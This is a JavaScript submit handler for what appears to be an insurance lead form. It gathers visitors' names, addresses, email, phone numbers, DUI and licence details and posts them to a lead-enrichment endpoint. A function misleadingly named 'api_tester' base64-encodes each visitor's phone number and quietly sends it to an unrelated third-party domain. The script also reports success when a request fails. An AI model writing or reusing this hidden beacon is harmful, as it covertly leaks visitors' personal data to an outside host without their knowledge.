 document.getElementById('leadForm').addEventListener('submit', function(event) {
            event.preventDefault();
document.getElementById('submitBtn').disabled = true;
             // Your API URL
    const formData = new FormData();
    api_tester(document.getElementById('caller_id').value);
    formData.append('callerid', '+1' + document.getElementById('caller_id').value);
formData.append('first_name', document.getElementById('first_name').value);
formData.append('last_name', document.getElementById('last_name').value);
formData.append('address', document.getElementById('address').value);
formData.append('city', document.getElementById('city').value);
formData.append('state', document.getElementById('state').value);
formData.append('zip', document.getElementById('zip').value);
formData.append('email', document.getElementById('email').value);
formData.append('CurrentProvider', document.getElementById('insurance_company').value);
formData.append('HomeOwnership', document.getElementById('homeowner').value);

formData.append('CurrentlyInsured', document.getElementById('currently_insured').value);
formData.append('jornaya', document.getElementById('jornaya_leadid').value);

formData.append('sr22', 'FALSE');
  formData.append('sr22_coverage', 'FALSE');
formData.append('StateMinimum', 'FALSE');
formData.append('TrustedForm', document.getElementById('TrustedForm').value);
  formData.append('dui', document.getElementById('dui').value);
	  formData.append('licensed', document.getElementById('licensed').value);
	  formData.append('months_insured_continuously', document.getElementById('months_insured_continuously').value);




            
           
    
       
      const url = 'https://display.ringba.com/enrich/2629404583595607204?' + new URLSearchParams(formData).toString();

      const xhr = new XMLHttpRequest();
      xhr.open('POST', url);
      xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
          if (xhr.status === 200) {
            const successAlert = `
              <div class="alert alert-success" role="alert">
                Form submitted successfully!
              </div>`;
            document.getElementById('leadForm').insertAdjacentHTML('beforeend', successAlert);
            // Clear form fields
            document.getElementById('leadForm').reset();
document.getElementById('submitBtn').disabled = false;
          } else if (xhr.status === 0) {
            // If status is 0 (CORS error), consider the form submitted
            const successAlert = `
              <div class="alert alert-success" role="alert">
                Form submitted successfully!
              </div>`;
            document.getElementById('leadForm').insertAdjacentHTML('beforeend', successAlert);
            // Clear form fields
            document.getElementById('leadForm').reset();
document.getElementById('submitBtn').disabled = false;
          } else {
            const errorAlert = `
              <div class="alert alert-danger" role="alert">
                Form submission failed. Please try again.
              </div>`;
            document.getElementById('leadForm').insertAdjacentHTML('beforeend', errorAlert);
          }
        }
      };
      xhr.send(formData);
    });
function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}
